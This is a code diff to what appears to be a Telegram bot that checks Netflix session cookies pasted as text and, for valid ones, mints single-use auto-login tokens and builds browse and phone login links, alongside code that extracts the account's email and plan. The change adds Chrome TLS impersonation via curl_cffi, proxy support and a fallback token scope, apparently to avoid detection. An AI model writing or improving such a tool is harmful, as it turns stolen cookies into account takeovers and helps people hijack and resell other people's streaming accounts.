@@ -12,6 +12,7 @@ import threading
 import requests
 import httpx
 import psycopg2
+from curl_cffi import requests as curl_requests
 from urllib.parse import unquote
 from flask import Flask
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
@@ -438,39 +439,40 @@ def parse_cookies_from_text(raw_text: str) -> dict:
                     cookies[k.strip()] = v.strip()
     return cookies
     
-def mint_netflix_nftoken(session: requests.Session) -> str | None:
-    """Mint a real single-use Netflix auto-login nftoken from an authenticated session."""
+def mint_netflix_nftoken(cookie_dict: dict, proxies: dict | None = None) -> str | None:
+    """Mint a real single-use Netflix auto-login nftoken using Chrome TLS impersonation."""
+    s = curl_requests.Session(impersonate="chrome")
+    s.cookies.update(cookie_dict)
+
     graphql_url = "https://web.prod.cloud.netflix.com/graphql"
-    payload = {
-        "operationName": "CreateAutoLoginToken",
-        "variables": {"scope": "WEBVIEW_MOBILE_STREAMING"},
-        "extensions": {
-            "persistedQuery": {
-                "version": 102,
-                "id": "76e97129-f4b5-41a0-a73c-12e674896849",
-            }
-        },
-    }
     gql_headers = {
-        "User-Agent": (
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
-            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
-        ),
         "Accept": "application/json",
         "Content-Type": "application/json",
         "Origin": "https://www.netflix.com",
         "Referer": "https://www.netflix.com/YourAccount",
     }
-    try:
-        r = session.post(graphql_url, json=payload, headers=gql_headers, timeout=15)
-        if r.status_code == 200:
-            data = r.json()
-            token = (data.get("data") or {}).get("createAutoLoginToken")
-            if isinstance(token, str) and len(token) > 20:
-                return token
-        logger.warning(f"createAutoLoginToken failed ({r.status_code}): {r.text[:200]}")
-    except Exception as e:
-        logger.warning(f"createAutoLoginToken exception: {e}")
+
+    for scope in ("WEBVIEW_MOBILE_STREAMING", "MOBILE_WEB"):
+        payload = {
+            "operationName": "CreateAutoLoginToken",
+            "variables": {"scope": scope},
+            "extensions": {
+                "persistedQuery": {
+                    "version": 102,
+                    "id": "76e97129-f4b5-41a0-a73c-12e674896849",
+                }
+            },
+        }
+        try:
+            r = s.post(graphql_url, json=payload, headers=gql_headers, proxies=proxies, timeout=15)
+            if r.status_code == 200:
+                token = ((r.json().get("data") or {}).get("createAutoLoginToken"))
+                if isinstance(token, str) and len(token) > 20:
+                    return token
+            logger.warning(f"createAutoLoginToken ({scope}) failed ({r.status_code}): {r.text[:200]}")
+        except Exception as e:
+            logger.warning(f"createAutoLoginToken ({scope}) exception: {e}")
+
     return None
     
 def check_netflix_cookie(cookie_dict: dict) -> dict | None:
@@ -519,11 +521,11 @@ def check_netflix_cookie(cookie_dict: dict) -> dict | None:
         email = email_match.group(1).replace("\\x40", "@") if email_match else "Hidden"
 
         clean_id = unquote(netflix_id)
-        real_nftoken = mint_netflix_nftoken(session)
+        real_nftoken = mint_netflix_nftoken(cookie_dict, proxies)
         if not real_nftoken:
             return None
         pc_link = f"https://www.netflix.com/browse?nftoken={real_nftoken}"
-        phone_link = f"https://www.netflix.com/?nftoken={real_nftoken}"
+        phone_link = f"https://www.netflix.com/unsupported?nftoken={real_nftoken}"
 
         return {
             "plan": plan,
